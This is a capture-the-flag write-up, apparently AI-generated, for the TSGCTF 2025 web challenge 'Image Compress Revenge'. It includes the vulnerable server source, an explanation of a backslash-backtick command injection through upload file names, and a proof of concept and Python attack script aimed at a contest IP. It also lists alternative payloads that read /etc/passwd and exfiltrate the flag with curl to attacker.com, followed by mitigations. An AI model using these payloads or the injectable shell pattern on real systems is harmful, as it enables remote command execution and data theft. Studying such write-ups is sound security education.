# image-compress-revenge

Attachment:

```typescript
import { Elysia, t } from "elysia";
import { unlink } from "fs/promises";
import { run } from "./lib/shell.ts";

const CHARS_TO_ESCAPE = "$'\"(){}[]:;/&`~|^!? \n".split("");

export function escape(source: string): string {
	let s = source;
	for (const char of CHARS_TO_ESCAPE) {
		s = s.replaceAll(char, "\\" + char);
	}
	return s;
}

const app = new Elysia()
	.get("/", () => {
		return Bun.file("./public/index.html");
	})
	.post(
		"/compress",
		async ({ body, set }) => {
			const { image, quality } = body;

			if (image.name.includes("..")) {
				throw new Error(`Invalid file name: ${image.name}`);
			}

			const inputPath = `./tmp/inputs/${escape(image.name)}`;
			const outputPath = `./tmp/outputs/${escape(image.name)}`;
			console.log(escape(image.name));

			try {
				await Bun.write(inputPath, image);

				await run(
					`magick "${inputPath}" -quality ${quality} -strip "${outputPath}"`,
				);

				const compressed = await Bun.file(outputPath).arrayBuffer();

				set.headers["Content-Type"] = image.type;
				set.headers["Content-Disposition"] =
					`attachment; filename="${image.name}"`;

				return new Response(compressed);
			} catch (error) {
				set.status = 500;
				return { error: `Failed to compress image: ${error}` };
			} finally {
				await unlink(inputPath).catch(() => {});
				await unlink(outputPath).catch(() => {});
			}
		},
		{
			body: t.Object({
				image: t.File({
					"file-type": "image/*",
					maxSize: "10m",
				}),
				quality: t.Numeric({
					minimum: 1,
					maximum: 100,
					default: 85,
				}),
			}),
		},
	);

app.listen(process.env.PORT ?? "3000", (server) => {
	console.log(
		`🦊 server is running at http://${server.hostname}:${server.port}`,
	);
});

// in shell.ts
import { spawn } from "bun";

export async function run(command: string) {
  const proc = spawn(["bash", "-c", command], {
    stderr: "pipe",
  });
  await proc.exited;
  if (proc.exitCode !== 0) {
    const err = await new Response(proc.stderr).text();
    throw new Error(`Shell command failed: \n${err}`);
  }
  const stdout = await new Response(proc.stdout).text();
  return stdout;
}
```

Solved by AI:

# TSGCTF 2025 - Image Compress Revenge Writeup

**Challenge**: Image Compress Revenge (Web)  
**Points**: Not specified  
**Author**: TSG  
**Date**: December 2025  
**Flag**: `TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt_and_r3ad0nly_15_r3qu1r3d_f0r_c0mmand_1nj3c710n_chall3ng35}`

## Challenge Description

> I tried making an app with Vibe coding. It's easy and nice, isn't it?
> 
> http://35.221.67.248:10502

We're given a web application that compresses images using ImageMagick. The source code is provided in `image-compress-revenge.tar.gz`.

## Initial Reconnaissance

### Application Overview
The application is a simple image compression service built with:

- **Bun** runtime
- **Elysia** web framework  
- **ImageMagick** for image processing

Users can upload an image, specify a quality setting (1-100), and download the compressed version.

### File Structure
```
image-compress-revenge/
├── compose.yaml          # Docker Compose configuration
└── server/
    ├── Dockerfile        # Container setup
    ├── server.ts         # Main application
    ├── lib/shell.ts      # Shell command execution wrapper
    ├── package.json      # Dependencies
    └── public/index.html # Frontend
```

### Key Code Analysis

#### `server.ts` - Main Application Logic
```typescript
const app = new Elysia()
  .post("/compress", async ({ body, set }) => {
    const { image, quality } = body;

    if (image.name.includes("..")) {
      throw new Error(`Invalid file name: ${image.name}`);
    }

    const inputPath = `./tmp/inputs/${escape(image.name)}`;
    const outputPath = `./tmp/outputs/${escape(image.name)}`;

    try {
      await Bun.write(inputPath, image);
      await run(`magick "${inputPath}" -quality ${quality} -strip "${outputPath}"`);
      // ... return compressed image
    } catch (error) {
      set.status = 500;
      return { error: `Failed to compress image: ${error}` };
    } finally {
      await unlink(inputPath).catch(() => {});
      await unlink(outputPath).catch(() => {});
    }
  }, {
    body: t.Object({
      image: t.File({ "file-type": "image/*", maxSize: "10m" }),
      quality: t.Numeric({ minimum: 1, maximum: 100, default: 85 }),
    }),
  });
```

#### `lib/shell.ts` - Command Execution
```typescript
export async function run(command: string) {
  const proc = spawn(["bash", "-c", command], {
    stderr: "pipe",
  });
  await proc.exited;
  if (proc.exitCode !== 0) {
    const err = await new Response(proc.stderr).text();
    throw new Error(`Shell command failed: \n${err}`);
  }
  const stdout = await new Response(proc.stdout).text();
  return stdout;
}
```

#### `escape()` Function - The Vulnerability
```typescript
const CHARS_TO_ESCAPE = "$'\"(){}[]:;/&`~|^!? \n".split("");

export function escape(source: string): string {
  let s = source;
  for (const char of CHARS_TO_ESCAPE) {
    s = s.replaceAll(char, "\\" + char);
  }
  return s;
}
```

## Vulnerability Analysis

### The Flawed Escape Function
The `escape()` function attempts to sanitize filenames by adding a backslash before special characters. However, it has several critical issues:

1. **Backslash is not in `CHARS_TO_ESCAPE`**: The backslash character (`\`) itself is not escaped, allowing it to be used in payloads.
2. **Context matters**: The escaped string is used inside double quotes in a bash command: `magick "${inputPath}" ...`
3. **Bash parsing nuances**: Inside double quotes, bash interprets `\`` as an escaped backtick (literal backtick), not as backslash-backtick.

### Command Injection Vector
When a filename contains backticks with an odd number of preceding backslashes, command substitution occurs:

1. Filename: 
  ```
  \`command\`.jpg
  ```
2. After `escape()`: 
  ```
  \\`command\\`.jpg
  ```
3. In bash command: 
  ```
  magick "./tmp/inputs/\\`command\\`.jpg" ...
  ```
4. Bash parsing inside `"..."`:
    - `\\` → `\` (single backslash)
5. Result: `` `command` `` - command substitution executes!

## Exploit Development

### Proof of Concept
```python
import requests

url = "http://35.221.67.248:10502/compress"
filename = '\\`echo $FLAG\\`.jpg'  # Note: double backslash in Python

# Minimal valid JPEG
jpeg_data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00'

files = {'image': (filename, jpeg_data, 'image/jpeg')}
data = {'quality': 85}

response = requests.post(url, files=files, data=data)
print(response.json()['error'])
```

### Exploit Output
```
Failed to compress image: Error: Shell command failed: 
bash: line 3: echo TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt_and_r3ad0nly_15_r3qu1r3d_f0r_c0mmand_1nj3c710n_chall3ng35}: command not found
bash: line 3: echo TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt_and_r3ad0nly_15_r3qu1r3d_f0r_c0mmand_1nj3c710n_chall3ng35}: command not found
magick: unable to open image './tmp/inputs/\.jpg': No such file or directory @ error/blob.c/OpenBlob/3596.
```

### Why the Flag Appears in Error
1. `` `echo $FLAG` `` executes, outputting the flag value
2. The output `TSGCTF{...}` becomes part of the "command" bash tries to execute
3. Bash error shows: `echo TSGCTF{...}: command not found`
4. The flag is revealed in the error message

## Full Exploit Chain

### Step-by-Step Execution
1. **User uploads** image with filename ```\`echo $FLAG\`.jpg```
2. **Server escapes** filename to ```\\`echo $FLAG\\`.jpg```
3. **Command constructed**: ```magick "./tmp/inputs/\\`echo $FLAG\\`.jpg" -quality 85 -strip "./tmp/outputs/\\`echo $FLAG\\`.jpg"```
4. **Bash parses** inside double quotes:
    - `\\` → `\`
    - Result: ``` `echo $FLAG` ```
5. **Command substitution** executes `echo $FLAG`
6. **Output** `TSGCTF{...}` replaces the backtick expression
7. **Final command**: `magick "./tmp/inputs/\.jpg" ...` (`.` from command output)
8. **Error occurs** because file `\.jpg` doesn't exist
9. **Error message** contains the command output (flag)

### Alternative Payloads
The vulnerability allows arbitrary command execution:

- ``` \`id\`.jpg ``` - Execute `id` command
- ``` \`cat /etc/passwd\`.jpg ``` - Read system files
- ``` \`bash -c "curl http://attacker.com/?flag=$(echo $FLAG)"\`.jpg ``` - Exfiltrate data

## Root Cause Analysis

### Multiple Failure Points

1. **Custom escape function**: Rolling your own security functions is error-prone
2. **Shell command construction**: User input directly in shell commands
3. **Bash parsing complexity**: Misunderstanding of how bash interprets escaped characters in quotes
4. **Missing backslash escaping**: Critical character omitted from escape list

### The "Vibe Coding" Hint
The challenge description mentions "Vibe coding" - likely referring to the trend of writing code quickly without proper security considerations, emphasizing speed over safety.

## Mitigation Strategies

### 1. Use Proper Shell Escaping
```typescript
import { escape } from "shell-escape";
// Or use child_process.spawn with array arguments
```

### 2. Avoid Shell Commands Entirely
```typescript
// Use ImageMagick Node.js bindings instead
import im from "imagemagick";
await im.convert([inputPath, "-quality", quality, "-strip", outputPath]);
```

### 3. Strict Input Validation
```typescript
// Allow only safe characters
if (!/^[a-zA-Z0-9._-]+\.(jpg|jpeg|png|gif)$/.test(filename)) {
  throw new Error("Invalid filename");
}
```

### 4. Use Temporary Random Filenames
```typescript
const randomName = crypto.randomBytes(16).toString("hex") + ".jpg";
const inputPath = `./tmp/inputs/${randomName}`;
// Store mapping from original filename to random name
```

### 5. Principle of Least Privilege
- Run ImageMagick in a sandboxed environment
- Use Docker with minimal capabilities
- Read-only filesystem where possible

## Flag Explanation
The flag `TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt_and_r3ad0nly_15_r3qu1r3d_f0r_c0mmand_1nj3c710n_chall3ng35}` hints at:

- `d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt` - Environment variables with `$` expansion
- `r3ad0nly_15_r3qu1r3d` - The filesystem is read-only (as seen in compose.yaml)
- `f0r_c0mmand_1nj3c710n_chall3ng35` - Classic command injection challenge

## Lessons Learned
1. **Never trust user input** - Always validate and sanitize
2. **Avoid shell commands** - Use library APIs when possible
3. **Understand your tools** - Bash parsing has many edge cases
4. **Security through obscurity doesn't work** - Custom escape functions are risky
5. **Error messages can leak information** - Be careful what errors reveal

## Conclusion
This challenge demonstrates a classic command injection vulnerability arising from improper input sanitization and misunderstanding of shell parsing rules. The combination of a flawed escape function, direct shell command construction, and bash's nuanced parsing of escaped characters inside quotes created a powerful exploit allowing arbitrary command execution and flag extraction.

The solution highlights the importance of using established security libraries, avoiding shell commands with user input, and thoroughly understanding the tools and languages we work with.

Attack script:

```python
#!/usr/bin/env python3
import requests

url = "http://35.221.67.248:10502/compress"

# Create a simple valid JPEG (minimal)
minimal_jpeg = (
    b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f'
    b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01'
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\x00\xb5\x10\x00\x02\x01\x03'
    b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
)

# Test command injection via backticks
# We need odd number of backslashes before backtick
# \`command\`.jpg -> \\`command\\`.jpg after escaping
test_commands = [
    # Try to get flag
    'echo $FLAG',
]

for cmd in test_commands:
    # Filename with backticks: \`command\`.jpg
    # This will become \\`command\\`.jpg after escaping
    filename = f'\\`{cmd}\\`.jpg'
    
    print(f"\n=== Testing command: {cmd} ===")
    print(f"Filename: {repr(filename)}")
    
    files = {
        'image': (filename, minimal_jpeg, 'image/jpeg'),
    }
    data = {
        'quality': 85
    }
    
    try:
        response = requests.post(url, files=files, data=data, timeout=10)
        print(f"Status: {response.status_code}")
        
        if response.status_code == 500:
            error_data = response.json()
            error_msg = error_data.get('error', 'Unknown error')
            print(f"Error (first 500 chars): {error_msg[:500]}")
            
            # Check if command output appears in error
            if 'bash:' in error_msg or 'command not found' in error_msg:
                print("✓ Shell command executed!")
        else:
            print(f"Response length: {len(response.content)}")
            print(f"Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
            
    except Exception as e:
        print(f"Exception: {e}")
```